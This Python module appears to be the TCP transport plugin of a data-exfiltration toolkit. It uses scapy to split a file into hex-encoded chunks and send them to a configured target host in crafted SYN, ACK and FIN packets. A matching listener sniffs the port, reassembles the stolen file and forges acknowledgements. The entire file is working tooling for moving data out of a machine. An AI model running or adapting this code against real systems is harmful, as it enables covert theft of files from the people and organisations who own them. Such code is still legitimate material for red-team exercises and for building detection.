import logging
import os

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Ether, sendp, Raw, sniff
from scapy.layers.inet import TCP, IP

config = None
app_exfiltrate = None


def send(exfiltrate_file, file):
    target = config['target']
    port = config['port']
    num_bytes = config['num_bytes']

    app_exfiltrate.log_message('warning', "[!] Registering packet for the file")
    data = "%s" % os.path.basename(exfiltrate_file.file_to_send)

    packet_index = 0
    ether = Ether()
    ip = IP(dst=target)

    tcp = TCP(dport=port, sport=exfiltrate_file.jobid, flags="S", seq=packet_index)
    pkt = ether / ip / tcp / Raw(load=data)
    sendp(pkt, verbose=0)

    while True:
        packet_index += 1
        data_file = file.read(num_bytes).encode('hex')
        if not data_file:
            break
        # ok("Using {0} as transport method".format(protocol_name))

        app_exfiltrate.log_message('info', "[tcp] Sending {0} bytes to {1}".format(len(data), target))
        tcp = TCP(dport=port, sport=exfiltrate_file.jobid, flags="A", seq=packet_index)
        pkt = ether / ip / tcp / Raw(load=data_file)
        sendp(pkt, verbose=0)

    data = "DONE:%s" % exfiltrate_file.checksum
    tcp = TCP(dport=port, sport=exfiltrate_file.jobid, flags="F", seq=packet_index)
    pkt = ether / ip / tcp / Raw(load=data)
    sendp(pkt, verbose=0)


def listen():
    port = config['port']
    sniff(filter="tcp and port " + str(port), prn=analyze)


def analyze(packet):
    src= packet.getlayer(1).src
    ip = IP(dst=src)
    tcp = packet.getlayer(2)
    ack = Ether() / ip / TCP(sport=tcp.dport, dport=tcp.sport, seq=tcp.fields['ack'], ack=tcp.fields['seq'] + 1)
    print(str(ack))

    jobid = tcp.sport
    packet_index = tcp.seq
    raw = packet.lastlayer()
    data = raw.fields['load']

    if packet_index == 0:
        app_exfiltrate.register_file(jobid, data)
        flags = "SA"
    elif data[0:5] == 'DONE:':
        app_exfiltrate.retrieve_file(jobid, data[5:])
        return
    else:
        flags = "A"
        app_exfiltrate.retrieve_data(jobid, packet_index, data)
    ack = Ether() / ip / TCP(sport=tcp.dport, dport=tcp.sport, seq=tcp.seq, flags=flags, ack=tcp.seq + 1)
    sendp(ack)


class Protocol:
    def __init__(self, app, conf):
        global config
        global app_exfiltrate
        config = conf
        app_exfiltrate = app
        app.register_protocol('tcp', {'send': send, 'listen': listen})
